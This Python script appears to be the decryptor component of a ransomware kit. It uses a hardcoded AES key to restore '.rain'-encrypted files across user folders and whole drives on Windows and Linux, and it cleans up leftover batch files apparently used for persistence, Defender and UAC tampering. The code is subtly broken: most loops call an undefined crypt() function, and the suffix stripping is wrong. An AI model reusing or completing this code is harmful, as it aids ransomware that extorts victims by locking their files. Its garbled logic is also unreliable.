try:
	import os
	import shutil
	import glob
	import platform
	from Crypto.Cipher import AES
	import platform
	from os import getenv,system
except:
	print('An error ocurred.')
	exit()

def decrypt(file):
	file_decrypto = open(file,'rb')
	file_decrypto = file_decrypto.read()
	correct = file_decrypto.rstrip(b'#')
	decifdata = aes.decrypt(file_decrypto)
	decifile = open(file,'wb')
	decifile.write(decifdata)
	decifile.close()
	os.rename(file,file.rstrip('.rain'))

k='u7x!A%D*G-KaPdSgVkYp3s5v8y/B?E(H'
aes = AES.new(k, AES.MODE_ECB)
ext=['*.rain']

sys = platform.system()
if sys=='Windows':
	try:
		os.remove('C:/Users/Public/prst.bat')
		os.remove('C:/Users/Public/wd.bat')
		os.remove('C:/Users/Public/uac.bat')
	except:
		pass

	desktop = os.path.expanduser('~/Desktop')
	documents = os.path.expanduser('~/Documents')
	downloads = os.path.expanduser('~/Downloads')
	appdt= getenv('APPDATA')

	os.chdir(desktop)
	for i in ext:
		try:
			files = glob.iglob(desktop+'/**/'+(i),recursive=True)
		except:
			pass
		for file in files:
			try:
				decrypt(file)
			except:
				pass

	os.chdir(documents)
	for i in ext:
		try:
			files = glob.iglob(documents+'/**/'+(i),recursive=True)
		except:
			pass
		for file in files:
			try:
				decrypt(file)
			except:
				pass

	os.chdir(downloads)
	for i in ext:
		try:
			files = glob.iglob(downloads+'/**/'+(i),recursive=True)
		except:
			pass
		for file in files:
			try:
				decrypt(file)
			except:
				pass

	try:
		dst = appdt+'/Microsoft/Windows/Themes/'
		os.chdir(dst)
		shutil.copy('C:/Users/Public/transold',dst+'TranscodedWallpaper')
	except:
		pass

	for i in ext:
		try:
			files = glob.iglob('C:/**/'+(i),recursive=True)
		except:
			pass
		for file in files:
			try:
				crypt(file)
			except:
				pass
elif sys=='Linux':
	desktop = os.path.expanduser('~/Desktop')
	area = os.path.expanduser('~/Área de trabalho')
	documents = os.path.expanduser('~/Documents')
	documentos = os.path.expanduser('~/Documentos')
	downloads = os.path.expanduser('~/Downloads')
	root = os.path.expanduser('/')

	try:
		os.chdir(desktop)
	except:
		os.chdir(area)
		for i in ext:
			try:
				files = glob.iglob(area+'/**/'+(i),recursive=True)
			except:
				pass
			for file in files:
				try:
					crypt(file)
				except:
					pass
	for i in ext:
		try:
			files = glob.iglob(desktop+'/**/'+(i),recursive=True)
		except:
			pass
		for file in files:
			try:
				crypt(file)
			except:
				pass
	try:
		os.chdir(documents)
	except:
		os.chdir(documentos)
		for i in ext:
			try:
				files = glob.iglob(documentos+'/**/'+(i),recursive=True)
			except:
				pass
			for file in files:
				try:
					crypt(file)
				except:
					pass

	for i in ext:
			try:
				files = glob.iglob(documents+'/**/'+(i),recursive=True)
			except:
				pass
			for file in files:
				try:
					crypt(file)
				except:
					pass

	os.chdir(downloads)
	for i in ext:
		try:
			files = glob.iglob(downloads+'/**/'+(i),recursive=True)
		except:
			pass
		for file in files:
			try:
				crypt(file)
			except:
				pass
	os.chdir(root)
	for i in ext:
		try:
			files = glob.iglob(root+'/**/'+(i),recursive=True)
		except:
			pass
		for file in files:
			try:
				crypt(file)
			except:
				pass
